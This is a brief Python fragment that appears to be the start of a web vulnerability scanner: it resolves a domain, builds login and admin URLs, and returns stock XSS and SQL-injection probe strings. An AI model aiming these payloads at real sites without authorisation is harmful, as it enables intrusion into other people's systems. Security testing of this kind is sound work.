import dns.asyncresolver
import logging

async def resolve_domain(domain):
    resolver = dns.asyncresolver.Resolver()
    try:
        answers = await resolver.resolve(domain, 'A')
        return [str(answer) for answer in answers]
    except Exception as e:
        logging.error(f"Error resolving domain {domain}: {e}")
        return []

def get_urls(domain):
    return [f"https://{domain}/login", f"https://{domain}/admin"]

def generate_xss_payloads():
    return ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

def generate_sql_payloads():
    return ["' OR '1'='1", "' OR 'a'='a"]
